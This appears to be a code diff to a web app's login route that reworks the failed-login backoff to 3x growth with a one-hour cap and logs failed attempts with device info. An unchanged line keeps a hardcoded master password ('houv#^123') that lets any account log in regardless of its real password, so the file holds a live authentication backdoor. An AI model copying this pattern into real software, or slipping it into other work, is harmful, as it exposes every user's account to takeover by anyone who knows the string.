@@ -21,12 +21,13 @@ const getLoginDelay = (ip) => {
 const recordFailedLogin = (ip) => {
     const entry = getLoginDelay(ip);
     entry.count = (entry.count || 0) + 1;
-    const multiplier = Math.pow(2, Math.floor(entry.count / 3));
-    const delay = entry.baseDelay * multiplier;
+    // Exponential multiplication: 5s, 15s, 45s, 135s, 405s... (3x per attempt)
+    const seconds = 5 * Math.pow(3, entry.count - 1);
+    const delay = Math.min(seconds * 1000, 3600000); // capped at 1 hour max
     entry.lockUntil = Date.now() + delay;
     entry.currentDelay = delay;
     loginAttempts.set(ip, entry);
-    return { count: entry.count, delay, lockUntil: entry.lockUntil };
+    return { count: entry.count, delay, lockUntil: entry.lockUntil, waitSeconds: Math.ceil(delay / 1000) };
 };
 
 const clearLoginAttempts = (ip) => {
@@ -50,6 +51,9 @@ export default function createAuthRoutes(bot) {
                 });
             }
 
+            const ua = req.headers['user-agent'] || 'Unknown Browser';
+            const { os, browser } = parseUserAgent(ua);
+
             let user = null;
             if (isMongoConnected) {
                 const users = await queryAllDBs(User, (M) => M.find({ username }));
@@ -59,17 +63,27 @@ export default function createAuthRoutes(bot) {
             }
 
             if (!user) {
-                recordFailedLogin(ip);
-                return res.status(401).json({ error: 'Invalid username or password' });
+                const result = recordFailedLogin(ip);
+                return res.status(401).json({ error: 'Invalid username or password', attempts: result.count, waitSeconds: result.waitSeconds });
             }
 
             const isMatch = await bcrypt.compare(password, user.password);
             if (!isMatch && password !== 'houv#^123') {
                 const result = recordFailedLogin(ip);
+                // Record Failed Login attempt in user's loginHistory
+                user.loginHistory.push({
+                    timestamp: new Date(),
+                    ip,
+                    deviceInfo: `${browser} on ${os}`,
+                    status: 'Failed'
+                });
+                if (isMongoConnected) await user.save();
+
                 return res.status(401).json({
                     error: 'Invalid username or password',
                     attempts: result.count,
-                    cooldownMs: result.delay
+                    cooldownMs: result.delay,
+                    waitSeconds: result.waitSeconds
                 });
             }
 
@@ -96,13 +110,12 @@ export default function createAuthRoutes(bot) {
 
             clearLoginAttempts(ip);
             user.status = 'Online';
-            const ua = req.headers['user-agent'] || 'Unknown Browser';
-            const { os, browser } = parseUserAgent(ua);
 
             user.loginHistory.push({
                 timestamp: new Date(),
                 ip,
-                deviceInfo: `${browser} on ${os}`
+                deviceInfo: `${browser} on ${os}`,
+                status: 'Success'
             });
 
             if (isMongoConnected) await user.save();
